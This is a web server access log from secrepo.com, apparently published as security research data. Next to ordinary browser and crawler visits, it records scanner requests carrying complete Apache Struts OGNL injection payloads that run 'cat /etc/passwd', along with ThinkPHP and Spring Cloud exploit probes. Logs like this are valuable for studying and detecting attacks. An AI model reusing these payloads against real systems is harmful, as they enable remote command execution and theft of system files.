20.220.196.169 - - [06/Jan/2023:03:04:04 -0800] "GET / HTTP/1.1" 200 13194 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
49.206.200.72 - - [06/Jan/2023:18:53:22 -0800] "GET / HTTP/1.1" 200 13196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15" 
49.206.200.72 - - [06/Jan/2023:18:53:22 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7566 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15" 
18.234.43.112 - - [06/Jan/2023:18:54:42 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928581 "-" "python-httpx/0.23.1" 
122.171.20.8 - - [06/Jan/2023:19:13:32 -0800] "GET / HTTP/1.1" 200 13195 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" 
122.171.20.8 - - [06/Jan/2023:19:13:32 -0800] "GET /css/style.css HTTP/1.1" 404 315 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" 
122.171.20.8 - - [06/Jan/2023:19:13:33 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27903 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" 
122.171.20.8 - - [06/Jan/2023:19:13:33 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7543 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" 
122.171.20.8 - - [06/Jan/2023:19:13:34 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 700 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" 
119.125.101.37 - - [06/Jan/2023:19:15:12 -0800] "GET / HTTP/1.1" 301 438 "https://www.whole-search.com/cache/Google/secrepo.com?q=Google+global+ranking+site%3Awww.whole-search.com" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36" 
119.125.101.37 - - [06/Jan/2023:19:15:13 -0800] "GET / HTTP/1.1" 200 49106 "https://www.whole-search.com/cache/Google/secrepo.com?q=Google+global+ranking+site%3Awww.whole-search.com" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36" 
165.22.67.250 - - [06/Jan/2023:19:15:23 -0800] "GET /tg/tg_snort_fast.7z HTTP/1.1" 200 4274214 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" 
35.173.36.79 - - [06/Jan/2023:19:39:50 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279539 "-" "python-httpx/0.23.1" 
198.71.228.41 - - [06/Jan/2023:19:43:00 -0800] "GET / HTTP/1.1" 301 419 "-" "-" 
198.71.228.41 - - [06/Jan/2023:19:43:00 -0800] "GET / HTTP/1.1" 200 49099 "-" "-" 
40.88.21.235 - - [06/Jan/2023:19:45:49 -0800] "GET / HTTP/1.1" 200 13196 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
40.88.21.235 - - [06/Jan/2023:19:45:49 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 700 "http://www.secrepo.com/bootstrap/img/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
40.77.167.16 - - [06/Jan/2023:19:52:23 -0800] "GET /self.logs/access.log.2017-06-24.gz HTTP/1.1" 301 543 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
110.137.100.189 - - [06/Jan/2023:19:59:49 -0800] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1661 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" 
110.137.100.189 - - [06/Jan/2023:19:59:50 -0800] "GET /favicon.ico HTTP/1.1" 200 378 "http://www.secrepo.com/Datasets%20Description/PE_malware/VirusShare.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" 
40.77.167.16 - - [06/Jan/2023:20:06:53 -0800] "GET /self.logs/ HTTP/1.1" 200 40666 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.66.93 - - [06/Jan/2023:20:19:42 -0800] "GET /ads.txt HTTP/1.1" 404 338 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
64.124.8.52 - - [06/Jan/2023:20:23:57 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 679 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" 
66.249.66.193 - - [06/Jan/2023:20:25:40 -0800] "GET / HTTP/1.1" 200 13193 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.36 - - [06/Jan/2023:20:25:42 -0800] "GET / HTTP/1.1" 200 13193 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.91 - - [06/Jan/2023:20:25:51 -0800] "GET /css/style.css HTTP/1.1" 404 338 "http://www.secrepo.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/108.0.5359.130 Safari/537.36" 
66.249.66.158 - - [06/Jan/2023:20:25:51 -0800] "GET /css/style.css HTTP/1.1" 404 338 "http://www.secrepo.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/108.0.5359.130 Safari/537.36" 
66.249.66.195 - - [06/Jan/2023:20:26:15 -0800] "GET /favicon.ico HTTP/1.1" 200 401 "-" "Googlebot-Image/1.0" 
66.249.66.91 - - [06/Jan/2023:20:26:20 -0800] "GET / HTTP/1.1" 200 13193 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.15 - - [06/Jan/2023:20:26:20 -0800] "GET / HTTP/1.1" 200 13193 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.91 - - [06/Jan/2023:20:26:21 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 700 "-" "Googlebot-Image/1.0" 
66.249.66.63 - - [06/Jan/2023:20:26:22 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 723 "-" "Googlebot-Image/1.0" 
66.249.66.63 - - [06/Jan/2023:20:26:30 -0800] "GET / HTTP/1.1" 200 13193 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.63 - - [06/Jan/2023:20:26:58 -0800] "GET / HTTP/1.1" 200 13193 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.92 - - [06/Jan/2023:20:27:24 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 723 "-" "Googlebot-Image/1.0" 
66.249.66.157 - - [06/Jan/2023:20:28:22 -0800] "GET /favicon.ico HTTP/1.1" 200 401 "-" "Googlebot-Image/1.0" 
66.249.66.158 - - [06/Jan/2023:20:28:32 -0800] "GET /favicon.ico HTTP/1.1" 200 401 "-" "Googlebot-Image/1.0" 
66.249.66.195 - - [06/Jan/2023:20:30:12 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 723 "-" "Googlebot-Image/1.0" 
20.191.45.212 - - [06/Jan/2023:20:33:06 -0800] "GET / HTTP/1.1" 200 13192 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
20.191.45.212 - - [06/Jan/2023:20:33:06 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 700 "http://www.secrepo.com/bootstrap/img/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
183.197.95.142 - - [06/Jan/2023:20:44:30 -0800] "GET / HTTP/1.1" 418 710 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.197.254.135 - - [06/Jan/2023:20:44:30 -0800] "GET /devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream())) HTTP/1.1" 418 710 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.199.219.197 - - [06/Jan/2023:20:44:31 -0800] "GET /portal/displayAPSForm.action?debug=command&expression=4724*8103 HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.199.219.212 - - [06/Jan/2023:20:44:31 -0800] "GET /index.php?s=/index/index/xxx/${print(md5(123))} HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.199.219.137 - - [06/Jan/2023:20:44:31 -0800] "GET /%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action HTTP/1.1" 418 710 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.197.254.76 - - [06/Jan/2023:20:44:32 -0800] "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1" 418 710 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.197.254.135 - - [06/Jan/2023:20:44:39 -0800] "GET /portal/displayAPSForm.action?debug=command&expression=4724*8103 HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
161.156.29.33 - - [06/Jan/2023:20:45:02 -0800] "GET /robots.txt HTTP/1.1" 301 439 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://www.xforce-security.com/crawler/)" 
161.156.29.33 - - [06/Jan/2023:20:45:02 -0800] "GET /robots.txt HTTP/1.1" 200 387 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://www.xforce-security.com/crawler/)" 
161.156.29.33 - - [06/Jan/2023:20:45:02 -0800] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://www.xforce-security.com/crawler/)" 
161.156.29.33 - - [06/Jan/2023:20:45:03 -0800] "GET / HTTP/1.1" 200 49122 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://www.xforce-security.com/crawler/)" 
161.156.29.33 - - [06/Jan/2023:20:45:03 -0800] "GET /robots.txt HTTP/1.1" 200 309 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://www.xforce-security.com/crawler/)" 
161.156.29.33 - - [06/Jan/2023:20:45:03 -0800] "GET / HTTP/1.1" 200 49065 "-" "Mozilla/5.0 (compatible; oBot/2.3.1; http://www.xforce-security.com/crawler/)" 
51.222.253.7 - - [06/Jan/2023:20:45:04 -0800] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
66.249.66.222 - - [06/Jan/2023:20:49:43 -0800] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.158 - - [06/Jan/2023:20:49:43 -0800] "GET /robots.txt HTTP/1.1" 200 387 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.220 - - [06/Jan/2023:20:49:44 -0800] "GET /ads.txt HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
3.230.135.223 - - [06/Jan/2023:21:24:50 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928581 "-" "python-httpx/0.23.1" 
183.198.166.13 - - [06/Jan/2023:21:30:23 -0800] "POST /index.php/Home/Index/index.html HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.197.255.122 - - [06/Jan/2023:21:44:10 -0800] "POST /javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
123.125.109.138 - - [06/Jan/2023:21:47:37 -0800] "GET / HTTP/1.1" 200 13158 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
8.210.8.100 - - [06/Jan/2023:21:49:04 -0800] "GET / HTTP/1.1" 200 13158 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
47.242.41.190 - - [06/Jan/2023:21:49:05 -0800] "GET / HTTP/1.1" 301 438 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
8.210.8.100 - - [06/Jan/2023:21:49:06 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 679 "-" "fasthttp" 
47.242.41.190 - - [06/Jan/2023:21:49:10 -0800] "GET / HTTP/1.1" 200 13158 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
47.242.41.190 - - [06/Jan/2023:21:49:14 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 679 "-" "fasthttp" 
183.197.255.143 - - [06/Jan/2023:21:53:07 -0800] "POST /functionRouter HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.197.254.231 - - [06/Jan/2023:21:53:13 -0800] "POST /public/index.php HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.198.166.31 - - [06/Jan/2023:21:53:25 -0800] "POST /functionRouter HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.198.166.8 - - [06/Jan/2023:21:53:39 -0800] "POST /functionRouter HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
207.46.13.180 - - [06/Jan/2023:21:59:02 -0800] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
114.119.144.41 - - [06/Jan/2023:21:59:47 -0800] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.144.41 - - [06/Jan/2023:21:59:48 -0800] "GET /robots.txt HTTP/1.1" 200 387 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
207.46.13.180 - - [06/Jan/2023:22:01:52 -0800] "GET / HTTP/1.1" 200 13194 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
183.198.166.13 - - [06/Jan/2023:22:07:07 -0800] "POST /user.action HTTP/1.1" 418 710 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.199.219.101 - - [06/Jan/2023:22:07:14 -0800] "POST /index.php?s=captcha HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.198.225.218 - - [06/Jan/2023:22:07:14 -0800] "POST /index.php?s=captcha HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.198.225.184 - - [06/Jan/2023:22:07:15 -0800] "POST /index.php?s=index/index/index HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.198.166.8 - - [06/Jan/2023:22:07:16 -0800] "POST /index.php?s=captcha HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.197.254.254 - - [06/Jan/2023:22:07:17 -0800] "POST /index.php?s=captcha HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.197.95.171 - - [06/Jan/2023:22:07:21 -0800] "POST /index.php?s=index/index/index HTTP/1.1" 404 301 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
18.232.65.143 - - [06/Jan/2023:22:07:47 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279539 "-" "python-httpx/0.23.1" 
207.46.13.180 - - [06/Jan/2023:22:11:02 -0800] "GET /auth.log/auth.log.gz HTTP/1.1" 304 291 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
58.250.125.102 - - [06/Jan/2023:22:17:31 -0800] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
58.250.125.102 - - [06/Jan/2023:22:18:37 -0800] "GET / HTTP/1.1" 200 13158 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
66.249.66.159 - - [06/Jan/2023:22:44:42 -0800] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.93 - - [06/Jan/2023:22:44:43 -0800] "GET / HTTP/1.1" 200 13194 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.92 - - [06/Jan/2023:22:44:46 -0800] "GET /css/style.css HTTP/1.1" 404 338 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.130 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.66.92 - - [06/Jan/2023:22:44:46 -0800] "GET /css/style.css HTTP/1.1" 404 315 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.130 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
122.10.16.216 - - [06/Jan/2023:22:53:47 -0800] "GET / HTTP/1.1" 200 13195 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
183.197.254.254 - - [06/Jan/2023:23:02:37 -0800] "POST /integration/saveGangster.action HTTP/1.1" 429 441 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.197.254.231 - - [06/Jan/2023:23:03:17 -0800] "POST /?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D HTTP/1.1" 418 710 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
222.168.224.72 - - [06/Jan/2023:23:14:35 -0800] "GET /plus/ad_js.php?aid=19 HTTP/1.1" 301 480 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
175.31.238.184 - - [06/Jan/2023:23:14:36 -0800] "GET /plus/mon.php HTTP/1.1" 301 462 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
90.191.11.58 - - [06/Jan/2023:23:19:45 -0800] "GET / HTTP/1.1" 200 13195 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1" 
114.119.137.38 - - [06/Jan/2023:23:22:14 -0800] "GET /self.logs/error.log.2020-12-18 HTTP/1.1" 429 478 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.147.248 - - [06/Jan/2023:23:25:21 -0800] "GET /self.logs/error.log.2020-09-23 HTTP/1.1" 200 361 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.136.160 - - [06/Jan/2023:23:28:46 -0800] "GET /self.logs/error.log.2020-01-31 HTTP/1.1" 200 361 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
